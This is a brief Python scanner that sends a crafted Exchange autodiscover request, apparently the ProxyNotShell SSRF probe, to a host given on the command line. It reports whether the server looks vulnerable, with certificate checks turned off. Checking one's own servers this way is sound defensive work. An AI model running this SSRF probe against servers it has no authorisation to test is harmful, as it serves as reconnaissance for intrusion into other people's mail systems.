import urllib3
import requests
import sys
import re
requests.packages.urllib3.disable_warnings()
def scanner(ip):
    ip = ip.strip()
    url = f"https://{ip}/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com"
    try:
        req = requests.get(url, timeout=10, verify=False, allow_redirects=False)
        if (req.status_code == 302) and (re.search("errorfe.aspx", req.text)):
            print (f"[+] {ip} Host is vulnerable ")
        else:
            print (f"[-] {ip} Host is not vulnerable")
    except Exception as error:
        print(error)

scanner(sys.argv[1])
